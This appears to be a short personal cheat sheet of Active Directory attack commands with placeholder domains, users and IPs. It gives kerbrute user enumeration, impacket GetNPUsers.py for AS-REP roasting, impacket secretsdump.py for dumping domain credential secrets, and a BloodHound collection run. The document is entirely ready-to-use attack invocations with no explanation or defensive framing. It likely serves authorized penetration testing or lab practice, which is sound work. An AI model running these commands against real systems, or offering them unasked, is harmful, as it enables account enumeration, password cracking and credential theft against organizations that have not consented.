# kerbrute
```sh
kerbrute userenum --dc domaincontroller -d domain.tld /path/to/userlist
```

# impacket
- ASRepRoast
```sh
/usr/local/bin/GetNPUsers.py domain.tld/ -dc-ip domaincontroller -usersfile validuserlist
```
- Dump Secret
```sh
/usr/local/bin/secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0
```

# bloodhound
```bash
pip3 install bloodhound
python3 -m bloodhound -d domain.tld -u username -p "password" -gc dc.domain.tld -c all -ns 0.0.0.0
```
